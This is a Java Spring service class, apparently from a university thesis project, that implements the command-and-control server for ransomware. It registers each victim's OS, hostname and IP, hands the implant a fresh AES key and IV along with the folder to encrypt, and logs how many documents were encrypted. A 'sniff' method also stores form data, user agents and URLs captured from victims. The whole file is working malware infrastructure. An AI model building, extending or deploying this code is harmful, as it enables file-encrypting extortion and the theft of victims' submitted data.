package it.ssri.tesi.c2.service;

import it.ssri.tesi.c2.dto.VictimDto;
import it.ssri.tesi.c2.model.Configuration;
import it.ssri.tesi.c2.model.Sniffer;
import it.ssri.tesi.c2.model.Victim;
import it.ssri.tesi.c2.repository.ConfigurationRepository;
import it.ssri.tesi.c2.repository.SnifferRepository;
import it.ssri.tesi.c2.repository.VictimRepository;
import lombok.RequiredArgsConstructor;
import lombok.SneakyThrows;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Service;

import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import java.security.SecureRandom;
import java.time.Instant;
import java.util.Base64;
import java.util.Map;
import java.util.Set;
import java.util.stream.Collectors;

@Slf4j
@Service
@RequiredArgsConstructor
public class C2Service {

    private final ConfigurationRepository configurationRepository;
    private final VictimRepository victimRepository;
    private final SnifferRepository snifferRepository;

    public VictimDto manageAttack(Map<String, String> data) {
        if(data.containsKey("action")) {
            if(data.get("action").equals("start")) {
                return startAttack(data);
            } else if(data.get("action").equals("end")) {
                return endAttack(data);
            } else if(data.get("action").equals("error") && data.containsKey("id")) {
                return onError(data);
            }
        }
        throw new IllegalStateException("Action not found");
    }

    @SneakyThrows
    private VictimDto startAttack(Map<String, String> data) {
        Configuration configuration = configurationRepository.findById("ENC_FOLDER").orElseGet(() -> {
            log.error("Configuration not found");
            return Configuration.builder().value("Test").build();
        });

        KeyGenerator keyGen = KeyGenerator.getInstance("AES");
        keyGen.init(128);
        SecretKey secretKey = keyGen.generateKey();

        String aesKey = Base64.getEncoder().encodeToString(secretKey.getEncoded());
        String aesIv = generateIv();

        Victim victim = Victim.builder()
                .aesKey(aesKey)
                .aesIv(aesIv)
                .os(data.get("os"))
                .osVersion(data.get("os_version"))
                .hostName(data.get("host_name"))
                .ipAddress(data.get("ip_address"))
                .encryptedFolder(configuration.getValue())
                .startAttackDate(Instant.now())
                .build();

        victimRepository.save(victim);

        return VictimDto.builder()
                .id(victim.getId())
                .encryptedFolder(configuration.getValue())
                .aesKey(aesKey)
                .aesIv(aesIv)
                .build();
    }

    private VictimDto endAttack(Map<String, String> data) {
        String uuid = getUUID(data);
        Victim victim = victimRepository.findById(uuid).orElseGet(() -> {
            log.error("Victim with id {} not found", uuid);
            return null;
        });

        if(victim != null && victim.getEndAttackDate() == null) {
            victim.setEndAttackDate(Instant.now());
            victim.setTotDocsEncrypted(Integer.parseInt(data.get("tot_docs_encrypted")));
            victim.setEffectiveEncryptedFolder(data.get("folder"));
            victimRepository.save(victim);
        }

        return VictimDto.builder()
                .id(uuid)
                .build();
    }

    private VictimDto onError(Map<String, String> data) {
        String uuid = getUUID(data);
        Victim victim = victimRepository.findById(uuid).orElseGet(() -> {
            log.error("Victim with id {} not found", uuid);
            return null;
        });

        if(victim != null) {
            victim.setEndAttackDate(Instant.now());
            victim.setError(data.get("error"));
            victimRepository.save(victim);
        }

        return VictimDto.builder()
                .id(uuid)
                .build();
    }

    private String generateIv() {
        byte[] iv = new byte[16];
        new SecureRandom().nextBytes(iv);
        return Base64.getEncoder().encodeToString(iv);
    }

    private static String getUUID(Map<String, String> data) {
        return data.get("id");
    }

    public void sniff(Map<String, String> data) {
        Set<String> keys = Set.of("uuid", "os", "user_agent", "lang", "ip_address", "url");

        Map<String, String> formData = data.entrySet().stream()
                .filter(e -> !keys.contains(e.getKey()))
                .collect(Collectors.toMap(
                        Map.Entry::getKey,
                        Map.Entry::getValue
                ));

        Sniffer sniffer = Sniffer.builder()
                .victimId(data.get("uuid"))
                .sniffDate(Instant.now())
                .os(data.get("os"))
                .userAgent(data.get("user_agent"))
                .language(data.get("lang"))
                .ipAddress(data.get("ip_address"))
                .url(data.get("url"))
                .data(formData.toString())
                .build();
        snifferRepository.save(sniffer);
    }

}
